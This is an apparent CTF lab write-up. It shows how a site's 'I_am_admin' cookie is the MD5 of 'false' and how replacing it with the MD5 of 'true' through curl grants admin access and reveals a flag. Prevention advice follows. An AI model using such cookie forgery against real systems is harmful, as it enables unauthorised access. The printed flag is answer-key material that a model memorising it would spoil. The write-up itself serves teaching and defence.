# Description

By looking at the data storage in the used browser we see that the website uses
a cookie with all sent requests called I_am_admin

```
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
```

# Attack

It appears that the it's value is hashed with md5 according to **https://crackstation.net**.

68934a3e9455fa72420237eb05902327 - false - Possible algorithms: MD5

```bash
*[main][~/goinfre/projects/darkly/email]$ md5 -s "false"
MD5 ("false") = 68934a3e9455fa72420237eb05902327
*[main][~/goinfre/projects/darkly/email]$ 
```

As we see the hashed value is false means that the user browsing the website is not admin

Let's try and change the value to true and see whats goin to happen.

Using md5 command to hash the value true 

```bash
*[main][~/goinfre/projects/darkly/email]$ md5 -s "true" 
MD5 ("true") = b326b5062b2f0e69046810717534cb09
*[main][~/goinfre/projects/darkly/email]$ 
```

Now using this value to send a request to any route and see what's going to happen. We are goin to use curl

```bash
*[main][~/goinfre/projects/darkly/email]$ curl  --cookie "I_am_admin=b326b5062b2f0e69046810717534cb09"  http://10.12.177.91/             
<script>alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3'); </script><!DOCTYPE HTML>
```

# Prevention

- **Use Stronger Authentication:** MD5 is a weak hashing algorithm that is susceptible to collision attacks. Use stronger and more secure hashing algorithms like SHA-256 or bcrypt to hash sensitive values like authentication tokens.

- **Salted Hashing:** Implement salted hashing, which involves adding a unique random value (salt) to each hash. This makes it much more difficult for attackers to precompute hashes for common values.

- **Session Management:** Use proper session management techniques, such as using secure, random session tokens instead of predictable values like "true" or "false".

- **HttpOnly and Secure Flags:** When setting cookies, use the HttpOnly flag to prevent JavaScript from accessing the cookie and the Secure flag to ensure cookies are only transmitted over secure (HTTPS) connections.

- **Tokenization and Authorization:** Instead of relying solely on a single cookie value for authentication, use tokenization techniques and proper authorization checks to validate a user's permissions.

- **Multi-Factor Authentication (MFA):** Implement MFA to add an extra layer of security by requiring users to provide additional information beyond just a cookie or password.

- **Regular Security Audits:** Conduct regular security audits and vulnerability assessments to identify and address potential security weaknesses.

- **Educate Developers:** Ensure that your development team is educated about secure coding practices and common vulnerabilities like improper use of authentication tokens.
